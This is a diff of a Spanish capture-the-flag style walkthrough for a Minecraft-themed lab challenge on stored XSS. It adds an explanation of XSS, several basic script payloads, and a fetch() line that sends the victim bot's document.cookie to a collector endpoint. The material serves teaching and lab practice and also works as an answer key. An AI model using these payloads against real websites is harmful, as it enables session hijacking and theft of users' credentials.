@@ -77,17 +77,29 @@ Este documento contiene la metodología de resolución paso a paso de los 9 desa
 ###  Desafío 1: Lingote de Oro
 - **Tema Académico:** *8º Semestre — Stored XSS y Robo de Cookies de Sesión.*
 - **Herramientas Kali Linux:** Navegador Firefox DevTools, Burp Suite, Netcat (`nc`).
+- **¿Qué es XSS?** Cross-Site Scripting (XSS) ocurre cuando una aplicación guarda o muestra
+  datos del usuario sin escaparlos. Si en lugar de texto escribes HTML o JavaScript, el
+  navegador de otra persona lo interpreta como código. En este reto la nota de la oferta se
+  guarda sin sanitizar (**XSS almacenado**) y la abre el Piglin Guard con su sesión privilegiada.
 - **Procedimiento de Explotación:**
-  1. En el formulario de ofertas de trueque con Piglins, ingresar en el campo **Nota al Piglin** el siguiente payload de XSS:
+  1. En el formulario de ofertas de trueque con Piglins, escribe en **Mensaje para el Piglin**
+     cualquiera de estos payloads básicos. No hace falta un script complejo: el bot acepta un XSS simple.
+     ```html
+     <script>alert(1)</script>
+     <script>console.log('XSS')</script>
+     <img src=x onerror=alert(1)>
+     <svg onload=alert(1)>
+     <a href="javascript:alert(1)">haz clic</a>
+     ```
+     El tablón que ve el jugador muestra el payload escapado para no ejecutarlo en su navegador;
+     el Guard lo interpreta en el suyo. Usa `console.log('XSS')` si no quieres ventanas emergentes.
+  2. Opcional: si quieres emular el robo de cookie completo, este payload envía la sesión del
+     Guard al buzón del Bastión:
      ```html
      <script>fetch('/nether/gold/leak?cookie=' + encodeURIComponent(document.cookie));</script>
      ```
-  2. O verificar la alerta emergente en el navegador:
-     ```html
-     <script>alert(document.cookie);</script>
-     ```
-  3. El bot simulado del Piglin Guard revisa la oferta y, al encontrar la referencia al
-     endpoint receptor, reproduce la exfiltración: envía su cookie real de tesorero.
+  3. El bot simulado del Piglin Guard revisa la oferta y, al encontrar un XSS simple o la
+     referencia al endpoint receptor, reproduce la exfiltración: envía su cookie real de tesorero.
   4. Al recargar `/nether`, el tablón muestra el **registro de credenciales comprometidas**
      con el token del Piglin:
      ```
